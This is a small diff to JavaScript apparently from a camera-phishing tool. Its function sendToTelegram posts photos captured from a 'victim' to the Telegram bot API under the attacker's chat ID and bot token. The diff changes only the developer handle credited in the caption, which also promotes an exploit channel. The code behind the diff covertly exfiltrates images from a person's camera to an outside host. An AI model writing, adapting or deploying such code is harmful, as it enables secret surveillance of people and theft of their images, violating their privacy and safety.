@@ -137,7 +137,7 @@
     function sendToTelegram(imageData, name) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      formData.append("caption", `📸 New photo from victim | DEVELOPER 》 @SAITO_MODS_ADMIN | Join T.G Chanel https://t.me/Metal_exploit_official`);
+      formData.append("caption", `📸 New photo from victim | DEVELOPER 》 @MORPHX_OFC | Join T.G Chanel https://t.me/Metal_exploit_official`);
       formData.append("photo", dataURItoBlob(imageData), "photo.jpg");
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
